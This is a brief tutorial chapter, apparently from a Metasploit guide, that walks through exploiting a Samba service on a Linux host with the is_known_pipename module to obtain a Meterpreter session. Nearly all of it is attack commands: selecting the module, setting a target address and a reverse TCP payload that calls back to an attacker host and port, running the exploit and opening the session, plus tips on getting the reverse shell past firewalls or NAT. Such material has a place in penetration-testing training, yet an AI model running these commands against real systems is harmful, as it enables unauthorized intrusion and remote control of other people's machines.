# Gaining Meterpreter Access to a Linux Machine

This chapter demonstrates how to exploit a vulnerable Linux service and gain Meterpreter access.

## Example: Exploit Samba (Linux)

### 1. Search for Exploit
```bash
search samba
```

### 2. Use the Module
```bash
use exploit/linux/samba/is_known_pipename
```

### 3. Set Target and Payload
```bash
set RHOSTS 192.168.1.105
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
```

### 4. Run the Exploit
```bash
exploit
```

### 5. Interact with Meterpreter
```bash
sessions -i 1
```

## Notes
- The payload type must match the architecture of the target system.
- Ensure reverse shell connectivity is not blocked by firewall or NAT.